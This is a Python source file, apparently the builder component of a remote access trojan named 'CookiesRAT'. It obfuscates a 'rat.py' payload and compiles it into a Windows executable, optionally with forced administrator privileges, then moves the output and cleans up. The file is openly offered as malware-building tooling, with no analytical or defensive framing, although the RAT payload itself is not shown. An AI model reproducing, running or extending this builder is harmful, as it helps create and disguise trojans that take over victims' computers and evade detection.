import os, shutil
from cookies_package import *
from builder.util.plugins.common import clear, cleanup, compile_forceadmin, compile
from colorama import Fore


def CookiesRAT():
    clear()
    try:
        fileName = "rat"
        force_admin = str(input(
            f'{Fore.CYAN}Do u want the payload to create with force admin {Fore.YELLOW}>> {Fore.RESET}'))

        obfusacate(f"{fileName}.py")   # Obfuscate the file

        if str(force_admin).lower() == 'yes' or str(force_admin).lower() == 'y':
            print(f"{Fore.CYAN}\nCreating payload named {Fore.GREEN}{fileName}{Fore.CYAN}.exe With Force Admin!\n{Fore.RESET}")
            compile_forceadmin(fileName)    # Compile the file to executable with force admin
        else:
            print(f"{Fore.CYAN}\nCreating payload named {Fore.GREEN}{fileName}.exe Without Force Admin!\n{Fore.RESET}")
            compile(fileName)   # Compile the file to executable without force admin

        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")   # Move the executable from dist folder to the current directory
        
        cleanup(fileName)   # Cleanup the files

    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error while making exe{Fore.RESET}: {e}')
        cleanup(fileName)   # Cleanup the files
        input(f'\n\n{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')
        return

    print(f"\n{Fore.GREEN}Finshed creating payload{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')


if __name__ == '__main__':
    CookiesRAT()